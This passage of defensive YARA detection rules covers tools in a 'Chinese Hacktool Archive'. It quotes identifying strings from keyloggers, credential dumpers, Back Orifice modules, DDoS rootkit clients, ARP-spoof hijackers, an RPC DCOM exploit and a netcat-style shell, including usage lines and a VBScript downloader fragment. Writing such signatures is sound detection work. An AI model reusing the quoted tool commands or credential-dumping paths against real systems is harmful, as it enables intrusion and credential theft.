		$s16 = "Checking passwords on accounts..." fullword wide
		$s17 = "Cerberus NBTDUMP" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_Controller {
	meta:
		description = "Chinese Hacktool Archive - file Controller.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "061723b9e95c464b039b2cba3f74ffddc4b58090"
	strings:
		$s0 = "C:\\windows\\system32\\test.log" fullword ascii
		$s5 = ": %s | SYNFlood: %s | ZXARPS: %s | " fullword ascii
		$s13 = "%04u.%02u.%02u-%02u-%02u-%02u.bmp" fullword ascii
		$s14 = "-listen 52880" fullword ascii
		$s15 = "name=\"Microsoft.Windows.Test\"" fullword ascii
		$s16 = "Thanks for your using. :)" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_AckCmdC {
	meta:
		description = "Chinese Hacktool Archive - file AckCmdC.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0b658cf26c019f04553d46aef2e80a092b3adac1"
	strings:
		$s8 = "Type \"quit\" and press Enter to quit" fullword ascii
		$s9 = "Too many bytes, I can't handle all that." fullword ascii
		$s12 = "AckCmd> " fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_rkScaner {
	meta:
		description = "Chinese Hacktool Archive - file rkScaner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "afb8b18465bd94777fee9f7f53310b75077d514e"
	strings:
		$s2 = "[+] IP: %s port: %i INFECTED with %s" fullword ascii
		$s3 = "Usage: rkdscan.exe xx.xx.xx.xx yy.yy.yy.yy" fullword ascii
		$s6 = "HACKER DEFENDER" fullword ascii
		$s9 = "vuln.txt" fullword ascii
		$s10 = "port: %i..." fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_Blast20_Blast {
	meta:
		description = "Chinese Hacktool Archive - file Blast.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9b71245d4e0bd3fa4d97823e909efa46a607f971"
	strings:
		$s0 = "Usage - blast xxx.xxx.xxx.xxx port size /t x /d x /ret x /nr" fullword wide
		$s1 = "xxx.xxx.xxx.xxx = target ip address" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_Scanner {
	meta:
		description = "Chinese Hacktool Archive - file Scanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "897c009fe3d94cf14f97b77fee783449bba2ad1b"
	strings:
		$s0 = "forming Time: %d/" fullword ascii
		$s4 = "DRDHt.txt" fullword ascii
		$s9 = "CTRL+C Is Presse" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_io_io_tcp {
	meta:
		description = "Chinese Hacktool Archive - file io_tcp.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5c2fa4ce067ea0f75a84e5a85af0c68201be6653"
	strings:
		$s2 = "io_tcp.dll" fullword ascii
		$s3 = "TCPIO: Back Orifice TCP IO Module v1.0" fullword ascii
		$s4 = "BO2K Simple Networking TCP" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_rmtSvc {
	meta:
		description = "Chinese Hacktool Archive - file rmtSvc.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0aaca20ccc12d29e2c2106204517bec6169ff721"
	strings:
		$s9 = "Winlogon.exe" fullword ascii
		$s11 = "200 PORT(%s:%d) command successful." fullword ascii
		$s16 = "HTTP server is sending file(%s),Range=%d - %d/%d" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_FindPass {
	meta:
		description = "Chinese Hacktool Archive - file FindPass.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "96a2264cb1211c2298c4d778fc90538bd1eb842c"
	strings:
		$s1 = "PasswordReminder is unable to find the password in memory." fullword ascii
		$s9 = "To find %S\\%S password in process %d ..." fullword ascii
		$s13 = "WINLOGON" fullword ascii
		$s14 = "Unable to add debug privilege." fullword ascii
		$s15 = "The hash byte is: 0x%2.2x." fullword ascii
		$s16 = "MSGINA" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_dsscan_DSScan {
	meta:
		description = "Chinese Hacktool Archive - file DSScan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a885c9566bd8148816f518e5f9f15f473d025a0b"
	strings:
		$s0 = "DSScan.exe" fullword wide
		$s1 = "Foundstone Inc." fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_iget {
	meta:
		description = "Chinese Hacktool Archive - file iget.vbe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ae21ffffb3e7047f531686b1e4dfbccae736092a"
	strings:
		$s0 = "Set xPost = CreateObject(\"Microsoft.XMLHTTP\")  " fullword ascii
		$s1 = "xPost.Open \"GET\",iRemote,0  " fullword ascii
		$s4 = "sGet.Write(xPost.responseBody)  " fullword ascii
		$s9 = "iRemote = LCase(WScript.Arguments(0))  " fullword ascii
		$s10 = "iLocal  = LCase(WScript.Arguments(1))  " fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_svcs_2 {
	meta:
		description = "Chinese Hacktool Archive - file svcs.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "50b22135a8206e29fb705f35bfd5581ffa012c6c"
	strings:
		$s0 = "%s -install fw c:\\fw.sys" fullword ascii
		$s1 = "OpenSCManager() failed. --err: %d" fullword ascii
		$s2 = "%s failed. --err: %d" fullword ascii
		$s7 = "Total %d Service(s)." fullword ascii
		$s17 = "|   http://www.safechina.net   |" fullword ascii
		$s19 = "The requested control code is not valid!" fullword ascii
		$s20 = "User-Mode Service" fullword ascii
	condition:
		6 of them
}

rule CN_Hacktools_ccpxpingexp {
	meta:
		description = "Chinese Hacktool Archive - file ccpxpingexp.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a559b1dcbd812cf301358e7e3dda32d3e52edcb8"
	strings:
		$s0 = "sohu.com" ascii
		$s3 = "GetLaFA" ascii
		$s4 = "By Goldsun 5261314@" ascii
	condition:
		all of them
}

rule CN_Hacktools_dat_xpf {
	meta:
		description = "Chinese Hacktool Archive - file xpf.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "761125ab594f8dc996da4ce8ce50deba49c81846"
	strings:
		$s2 = "UnHook IoGetDeviceObjectPointer ok!" fullword ascii
		$s6 = "\\Device\\XScanPF" fullword wide
		$s7 = "\\DosDevices\\XScanPF" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_EditServer_2 {
	meta:
		description = "Chinese Hacktool Archive - file EditServer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f367596ae847c93b1e5250910ed08f50de8c14c7"
	strings:
		$s0 = "@HOTMAIL.COM" ascii
		$s1 = "?Inject " fullword ascii
		$s6 = "Press Any Ke" ascii
	condition:
		all of them
}

rule CN_Hacktools_ProgBattle {
	meta:
		description = "Chinese Hacktool Archive - file ProgBattle.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "904dd1229d17ba49aa6939be9632bc1439e2effb"
	strings:
		$s0 = "Programe(ID=%i Name:\"%s\") dead." fullword ascii
		$s3 = "-------BEGIN disass from %i to %i---------------" fullword ascii
		$s5 = "ProgBattle.EXE" fullword wide
		$s6 = "http://www.xfocus.net" fullword wide
		$s12 = "watercloud@xfocus.org" fullword wide
		$s13 = "Linesens : Free use, Free spreed." fullword wide
		$s17 = "%-6i  %3s  %c %-4i , %c %-4i ( id: %-5i pid: %-5i tid: %-5i )" fullword ascii
		$s18 = "Load file error : no  memory." fullword ascii
		$s19 = "opcode muset give one or two data field" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_hkshell_hkrmv {
	meta:
		description = "Chinese Hacktool Archive - file hkrmv.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a53cff972f7494e2b569973e9726afb12529a47b"
	strings:
		$s3 = "EXECUTABLE" fullword wide
		$s4 = "bird.ico" fullword ascii
		$s6 = "xception" fullword ascii
		$s7 = "CLOSEDFOLDER" fullword wide
		$s18 = "OPENFOLDER" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_ControlTelnet {
	meta:
		description = "Chinese Hacktool Archive - file ControlTelnet.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4c3aff3554b2275db80962c49bcdb5d672341a58"
	strings:
		$s1 = "ControlTelnet.exe" fullword wide
		$s2 = "ResumeTelnet.exe" fullword ascii
		$s4 = "StartTelnet.exe" fullword ascii
		$s5 = "Inetufo@163.net" fullword ascii
		$s14 = "Written By Inetufo" fullword wide
		$s16 = "\\winhlp32.exe" fullword ascii
		$s19 = "www.fz5fz.org" fullword wide
	condition:
		3 of them
}

rule CN_Hacktools_tools_sfbfwin {
	meta:
		description = "Chinese Hacktool Archive - file sfbfwin.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "dc4bee331dc7d94363fbdf960cea3a03808609fb"
	strings:
		$s0 = "Send contents of <file> and log return." fullword ascii
		$s2 = "./program <-p port> <-t threads> [ -f file ] | [-r <startip-endip> ] <mode>" fullword ascii
		$s6 = "Get Banner.(ftp servers,etc.)" fullword ascii
		$s12 = "+MODE_HTTP_SERVER" fullword ascii
		$s13 = "-Can open file: %s" fullword ascii
		$s14 = "Real server" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_RTCLIENT {
	meta:
		description = "Chinese Hacktool Archive - file RTCLIENT.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "93234e03939a4a078bf1bf0f9298c33947182290"
	strings:
		$s1 = "usage:%s destip [-p password] [-t proto] [-o port]  [-y icmp_type] [-d icmp_code" ascii
		$s3 = "Example:%s 1.1.1.100 -p yyt_hac -t 1 -c ddos 1.1.1.23 139 2 300 20" fullword ascii
		$s12 = "password-----------The ntrootkit's password" fullword ascii
		$s17 = "The DDos command usage:DDOS DDos_Destip [DDos_Destport DDos_type DDos_seconds DD" ascii
	condition:
		1 of them
}

rule CN_Hacktools_tools_dnsscan {
	meta:
		description = "Chinese Hacktool Archive - file dnsscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "568b7acca2ee77daa8fc03001bfdee94bb6b212a"
	strings:
		$s1 = "dnsscan.dll" fullword ascii
		$s3 = "No DNS Service" fullword ascii
		$s4 = "with vendor patches.<P><HR>" fullword ascii
		$s5 = "Checking DNS Service..." fullword ascii
		$s6 = "./reports/dns" fullword ascii
		$s8 = "There are a number of security issues with BIND / DNS. Ensure you keep up to dat" ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_xHijack {
	meta:
		description = "Chinese Hacktool Archive - file xHijack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "dec8175ca08064b2d0e9d8b5f76feb372d77178f"
	strings:
		$s0 = "<-- Hijack the number x connection to execute command" fullword ascii
		$s1 = "Error sending the arp spoof packets!" fullword ascii
		$s5 = "Error:failed to allocate the LPPACKET structure for Arp spoof." fullword ascii
		$s18 = "Error sending the hijack packets!" fullword ascii
		$s20 = "(%d) %s:%d <--> " fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_SMBdie {
	meta:
		description = "Chinese Hacktool Archive - file SMBdie.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d0be1831303effbc99481ffd38929b8ba164af35"
	strings:
		$s3 = "Privileged instruction%Exception %s in module %s at %p." fullword wide
		$s12 = "Connection to IPC$ has been refused." fullword ascii
		$s16 = "-Is it possible to crash Windows computers by " fullword ascii
		$s17 = "WINDOWS .NET" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_exe2vbs {
	meta:
		description = "Chinese Hacktool Archive - file exe2vbs.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2b1cb7e27e0aa144c6765d5ec76a727d417b3b10"
	strings:
		$s0 = "Command&" fullword ascii
		$s1 = "exe2vbs.exe" fullword wide
		$s9 = "Project1" fullword wide
		$s15 = "CrackerZ" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_smbrelay2 {
	meta:
		description = "Chinese Hacktool Archive - file smbrelay2.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4989e488049c9a4fe69451ce156db88b4e7b775c"
	strings:
		$s1 = "/S SourceName  - Use SourceName when connecting to target" fullword ascii
		$s5 = "/T TargetName  - Connect to TargetName for relay" fullword ascii
		$s6 = "Non SMB message, magicval: %08x length %d bytes target %s" fullword ascii
		$s15 = "Security signatures required by server *** THIS MAY NOT WORK!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ASM2Shellcode_NASM {
	meta:
		description = "Chinese Hacktool Archive - file NASM.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6abf21c2f084e5911ae4143adeb6869a702f8cdb"
	strings:
		$s2 = "file name already ends in `%s': output will be in `nasm.out'" fullword ascii
		$s3 = "%s not supported in preprocess-only mode" fullword ascii
		$s17 = "-X<format>  specifies error reporting format (gnu or vc)" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_bat2com {
	meta:
		description = "Chinese Hacktool Archive - file bat2com.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "80af2d2944d4e7820c80959f84f74d88de5f6ee2"
	strings:
		$s0 = "Error in" fullword ascii
		$s1 = "greater" ascii
		$s2 = "Magazine" fullword ascii
		$s5 = "BAT2EXEC" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_stripperX {
	meta:
		description = "Chinese Hacktool Archive - file _stripperX.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "03fcd12c3920948f448fb9d7924020d2ca10e630"
	strings:
		$s0 = "stripperX.exe" fullword wide
		$s3 = "stripper v2.11 - asprotect unpacker" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_QueryProc {
	meta:
		description = "Chinese Hacktool Archive - file QueryProc.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "bf1426706dda9baeab0948a49fb0a61d5ac3d7c0"
	strings:
		$s0 = "QueryProc.exe -c processid handle" fullword ascii
		$s11 = "QueryProc.exe \\Device\\Tcp" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_creddump {
	meta:
		description = "Chinese Hacktool Archive - file creddump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d781dd8f953b510d71dbd053d24bef01b20858a1"
	strings:
		$s0 = "%s\\Microsoft\\Credentials\\%s\\credentials" fullword ascii
		$s10 = "Last Modified: %02d/%02d/%d - %02d:%02d:%02d" fullword ascii
		$s11 = "Password: %s" fullword ascii
		$s12 = "LSASS.EXE" fullword wide
		$s14 = "\\creddump.dll" fullword ascii
		$s18 = "Unable to adjust token privileges: %d" fullword ascii
		$s19 = "Foundation.  NO WARRANTY, EXPRESSED OR IMPLIED, IS GRANTED WITH THIS PROGRAM." fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_CnCerT_Net_SKiller {
	meta:
		description = "Chinese Hacktool Archive - file CnCerT.Net.SKiller.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a8782a1a8771e05fb78fe225a96c196a92041b11"
	strings:
		$s2 = "CnCerT.Net.SKiller.exe" fullword wide
		$s3 = "Host Attack Tool" fullword wide
		$s19 = "Skiller Demo" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_srv_system {
	meta:
		description = "Chinese Hacktool Archive - file srv_system.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f1d73b7a3a0758566ce373278e237a28210cb8d5"
	strings:
		$s1 = "ScreenSaver password: '%s'" fullword ascii
		$s2 = "SECURITY\\SAM\\Domains\\Account\\Users" fullword ascii
		$s10 = "Resource: '%.256s'  Password: '%.256s'" fullword ascii
		$s12 = "Memory: %dM in use: %d%%  Page file: %dM free: %dM" fullword ascii
		$s20 = "Passwords cached by system:" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_rainbowcrack_1_2_win_rtsort {
	meta:
		description = "Chinese Hacktool Archive - file rtsort.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "60e1c51192b9c42d1ccc8fc060246db242742e94"
	strings:
		$s0 = "http://www.antsight.com/zsl/rainbowcrack/" fullword ascii
		$s2 = "by Zhu Shuanglei <shuanglei@hotmail.com>" fullword ascii
		$s7 = "usage: rtsort rainbow_table_pathname" fullword ascii
		$s12 = "available physical memory: %u bytes" fullword ascii
		$s16 = "loading rainbow table..." fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_PromiScan {
	meta:
		description = "Chinese Hacktool Archive - file PromiScan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d3964c5ed6a20a94c11a5d8046fd4ef7077469eb"
	strings:
		$s4 = "SecurityFriday.com" fullword wide
		$s5 = "promiscan.exe" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_bcwipe3 {
	meta:
		description = "Chinese Hacktool Archive - file bcwipe3.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "570b3d8c8271a1753dddc44d19d7dc956147f11f"
	strings:
		$s1 = "Can not get procedure address - '%s'" fullword ascii
		$s9 = "WAP1.EXE" fullword ascii
		$s16 = "Program Files\\CryptoSwap.exe" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_pop3scan {
	meta:
		description = "Chinese Hacktool Archive - file pop3scan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b12a7c32d17fe494cbd5e3eb2d3586f1043b0e11"
	strings:
		$s2 = "pop3scan.dll" fullword ascii
		$s7 = "<P>No POP3 Service" fullword ascii
		$s12 = "<H3>Security Issues</H3>" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_auth_null {
	meta:
		description = "Chinese Hacktool Archive - file auth_null.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "655b6e73da64b366a2446871f6642f180d38de0d"
	strings:
		$s0 = "auth_null.dll" fullword ascii
		$s1 = "NULLAUTH: Single User / Encrypt Only" fullword ascii
		$s2 = "BO2K Null Authentication" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_TasmTest {
	meta:
		description = "Chinese Hacktool Archive - file TasmTest.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0dd983e60cb0559d49c852d8e889511a986b338f"
	strings:
		$s0 = "Written By" fullword ascii
		$s1 = "ShADe & CodeFumbler" fullword ascii
		$s2 = "IdeasM v1.0" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_rpc_Rpcdcom {
	meta:
		description = "Chinese Hacktool Archive - file Rpcdcom.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f7cbf4378017e9aeab7e0e31ab1169d79c7c5d2b"
	strings:
		$s6 = "\\\\\\C$\\123456111111111111111.doc" fullword wide
		$s7 = "All Windows Version (chinese)" fullword ascii
		$s9 = "- Remote DCOM RPC Buffer Overflow Exploit" fullword ascii
		$s12 = "Windows 2000 SP3 (chinese)" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Binary_Loader {
	meta:
		description = "Chinese Hacktool Archive - file Loader.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7ce77425bcc5e79fe2367bcf5edb399082acac74"
	strings:
		$s1 = "Loader.exe" fullword wide
		$s7 = "\\Server.dll" fullword wide
		$s8 = "\\iexplore.exe" fullword wide
		$s9 = "\\WebServer.Exe" fullword wide
		$s11 = "VBA5.DLL" fullword ascii
		$s13 = "wscript.shell" fullword wide
		$s16 = "Diplomatik" fullword wide
		$s19 = "Loader" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_He4HookInv_2 {
	meta:
		description = "Chinese Hacktool Archive - file He4HookInv.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "415310ae91f13ef3495a5a21657dc82461c542b1"
	strings:
		$s4 = "ree\\He4HookInv.sys" fullword ascii
		$s6 = "He4HookInv.sys" fullword ascii
		$s7 = "Start IntermediateIrpCompletion %08x !!!!" fullword ascii
		$s9 = "Not implemented yet !!!!" fullword ascii
		$s12 = "ByOne = TRUE!!!!" fullword ascii
		$s13 = "__InvisibleDriverUnload@0" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_public_ctrldll {
	meta:
		description = "Chinese Hacktool Archive - file ctrldll.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d1fda3ecf414f8ca343872840c25689fecd40455"
	strings:
		$s0 = "ctrldll.dll" fullword ascii
		$s1 = ".SharedD" fullword ascii
		$s2 = "UnSetKeybdHook" fullword ascii
		$s3 = "SetKeybdHook" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_TK2006_scanner {
	meta:
		description = "Chinese Hacktool Archive - file scanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fc299c0a511a5e645af822a8949ca4715c26248b"
	strings:
		$s1 = "Failed to construct ICMP header!" fullword ascii
		$s2 = "Windows NT/2000 server that is not a domain controller" fullword ascii
		$s12 = "karamay@vip.sina.com" fullword wide
		$s13 = "dic\\ftppass.dic" fullword ascii
		$s20 = "||CJ60Lib|http://www.vckbase.com||" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_eyes {
	meta:
		description = "Chinese Hacktool Archive - file eyes.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e576ef0d518a9ab48f13808e5888c16e09cc4421"
	strings:
		$s0 = "PROTEIN_CHECKBOX_DISABLE_CHECK PROTEIN_CHECKBOX_DISABLE_UNCHECK" fullword wide
		$s13 = "DEEPBLUE_CHECKBOX_UNCHECK" fullword wide
		$s14 = "TPASSWORDDIALOG" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_superscan {
	meta:
		description = "Chinese Hacktool Archive - file superscan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d"
	strings:
		$s0 = "STUB.EXE" fullword wide
		$s1 = "STUB32.EXE" fullword wide
		$s3 = "\\scanner.ini" fullword ascii
		$s7 = "\\ws2check.exe" fullword ascii
		$s10 = "\\trojans.lst" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_sbd {
	meta:
		description = "Chinese Hacktool Archive - file sbd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4e30ff8cb7c4f5dc2d326b609d4b81b2f9b6ccb2"
	strings:
		$s0 = "to CR+LF (this must be on if you're executing command.com on" fullword ascii
		$s1 = "http://www.cr0.net:8040/). default is: -c %s" fullword ascii
		$s10 = "C:\\>sbd -lvp 1234 < NUL > outfile.ext" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Binary_Server {
	meta:
		description = "Chinese Hacktool Archive - file Server.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "352895fdeac5ec22bd45ae3cc7ddff63d6c6b16c"
	strings:
		$s0 = "*\\AD:\\FWBDOW~1\\Server.vbp" fullword wide
		$s1 = "Server.dll" fullword wide
		$s2 = "\\Server.dll" fullword wide
		$s3 = "\\WebServer.Exe" fullword wide
		$s4 = "VBA5.DLL" fullword ascii
		$s5 = "Directserver" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_bin_inject {
	meta:
		description = "Chinese Hacktool Archive - file inject.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "44d36bdb3c7d36605bd3fb8a7a4d00547f0e8c86"
	strings:
		$s2 = "-> inject dll to all process" fullword ascii
		$s3 = "[-] inject \"%s\" to %d failed." fullword ascii
		$s5 = "[+] inject \"%s\" to %d success." fullword ascii
		$s6 = "modifed by eyas <eyas at xfocus.org>" fullword ascii
		$s7 = "code ripped from jiurl <jiurl at mail.china.com>" fullword ascii
		$s8 = "AdjustTokenPrivileges failed: %u" fullword ascii
		$s9 = "Usage: %s <dll_full_path)> <pid>" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_kademlia {
	meta:
		description = "Chinese Hacktool Archive - file kademlia.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "349b5e7f64583aac0f93cf9b39b0e008e7e40e78"
	strings:
		$s7 = "Failed to create new listener thread (%s port %ld) [Error 0x%04X%ld]" fullword ascii
		$s16 = "Error: Failed to compress Kademlia packet" fullword ascii
		$s17 = "$@No contacts found, please bootstrap, or download a contact.dat file." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_windump {
	meta:
		description = "Chinese Hacktool Archive - file windump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a06782e62492d18aeab051879a91e7462685851f"
	strings:
		$s0 = "%s version %s, based on tcpdump version %s" fullword ascii
		$s1 = "@(#) $Header: /tcpdump/master/tcpdump/missing/inet_aton.c,v 1.1.2.1 2000/01/11 0" ascii
	condition:
		all of them
}

rule CN_Hacktools_EliteKeylogger1_0 {
	meta:
		description = "Chinese Hacktool Archive - file EliteKeylogger1.0.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "57514200b1591556a4604f6df2775760793cfad9"
	strings:
		$s0 = "keyloginstaller.exe" fullword ascii
		$s3 = "keylogsetup.exe" fullword ascii
		$s8 = "From: <logs@logs.com>" fullword ascii
		$s9 = "fff2.exe" fullword ascii
		$s10 = "\\ssvchost.exe" fullword ascii
		$s12 = "\\msvchost.exe" fullword ascii
		$s13 = "http://www.elitec0ders.net" fullword ascii
		$s14 = "fff.exe" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_Packet9x_Packet {
	meta:
		description = "Chinese Hacktool Archive - file Packet.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c197e1be3ecfe12c03a7235e7d11c695916670ff"
	strings:
		$s0 = "Packet.dll" fullword ascii
		$s1 = "\\\\.\\PACKET.VXD" fullword ascii
		$s2 = "PACKET.DLL" fullword ascii
		$s3 = "PacketResetAdapter" fullword ascii
		$s6 = "StopPacketDriver" fullword ascii
		$s7 = "StartPacketDriver" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_Recton {
	meta:
		description = "Chinese Hacktool Archive - file Recton.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "bac8145d136a2787bbeb7c436559eaf42c19612f"
	strings:
		$s0 = "Recton.exe" fullword wide
		$s1 = "Remote WMI Control" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_tInfor {
	meta:
		description = "Chinese Hacktool Archive - file tInfor.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "228d8e4fe33f69fa4908aa34a30678b13e723e22"
	strings:
		$s0 = "Show Token Information of Process or Thread." fullword wide
		$s1 = "TokenInfor.exe" fullword wide
		$s2 = "TokenInfor Show Token Information of Specify Process or Thread. by bingl" wide
	condition:
		all of them
}

rule CN_Hacktools_SCANSTAR {
	meta:
		description = "Chinese Hacktool Archive - file SCANSTAR.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e5518240099e3fd84526bfbeab9db4b04a4e938b"
	strings:
		$s0 = "SCANSTAR.EXE" fullword wide
		$s1 = "conime.exe" fullword ascii
		$s2 = "LSASS.exe" fullword ascii
		$s4 = "CTFMON.exe" fullword ascii
		$s9 = "MDM.exe" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_CmessBox {
	meta:
		description = "Chinese Hacktool Archive - file CmessBox.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f416c8d6f99d6542c3915357288a3f5fa86e9118"
	strings:
		$s0 = "C:\\WINDOWS\\system32\\msvbvm60." fullword ascii
		$s1 = "CmessBox.dll" fullword ascii
		$s5 = "EVENT_SINK_" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_SetPaths {
	meta:
		description = "Chinese Hacktool Archive - file SetPaths.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b3c49b756720829f303befc6c3598a3b7f901ee0"
	strings:
		$s8 = "SQLExecute FAILED!" fullword ascii
		$s9 = "SELECT Title,HelpFile FROM Files;" fullword ascii
	condition:
		all of them
